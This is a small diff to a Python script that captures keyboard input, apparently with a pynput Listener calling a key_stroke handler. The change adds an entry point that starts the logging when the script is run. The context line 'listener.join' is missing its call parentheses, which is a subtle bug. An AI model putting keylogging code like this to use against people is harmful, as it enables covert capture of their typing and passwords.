@@ -31,3 +31,6 @@ def key_stroke(key):
 def start_logging():
     with Listener(on_press=key_stroke) as listener:
         listener.join
+
+if __name__ == "__main__":
+    start_logging()
